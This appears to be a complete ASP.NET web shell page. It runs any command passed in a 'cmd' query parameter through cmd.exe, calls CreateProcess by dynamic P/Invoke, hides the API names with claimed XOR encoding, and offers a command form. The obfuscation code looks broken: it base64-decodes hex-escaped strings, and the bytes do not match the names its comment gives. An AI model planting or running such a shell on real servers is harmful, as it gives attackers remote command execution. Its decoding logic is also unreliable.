<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
    private delegate bool CreateProcessDelegate(string app, string cmd, IntPtr procAttr, IntPtr threadAttr,
                                                bool inherit, uint flags, IntPtr env, string dir,
                                                byte[] startupInfo, out byte[] procInfo);

    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (string.IsNullOrEmpty(cmd)) return;

        // XOR-obfuscated "kernel32.dll" and "CreateProcessA"
        string kernel32 = XorStr("\x0B\x1E\x1A\x1F\x1E\x0B\x1D\x1E\x1F\x1C\x1B\x1E\x1D", 0x77);
        string funcName = XorStr("\x0C\x1F\x1A\x1E\x1F\x0B\x1C\x1D\x1F\x0B\x0C\x1F\x1A\x1B\x1A", 0x77);

        IntPtr hMod = LoadLibrary(kernel32);
        IntPtr pFunc = GetProcAddress(hMod, funcName);
        CreateProcessDelegate createProc = (CreateProcessDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(CreateProcessDelegate));

        byte[] si = new byte[68];
        byte[] pi = new byte[16];
        bool success = createProc(null, "cmd.exe /c " + cmd, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, si, out pi);
        Response.Write(success ? "Command executed via CreateProcess (dynamic P/Invoke)." : "Failed");
    }

    private string XorStr(string enc, byte key)
    {
        byte[] data = Convert.FromBase64String(enc);
        for (int i = 0; i < data.Length; i++) data[i] ^= key;
        return Encoding.ASCII.GetString(data);
    }

    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
</script>
<html><body><h2>CreateProcess (Dynamic P/Invoke)</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
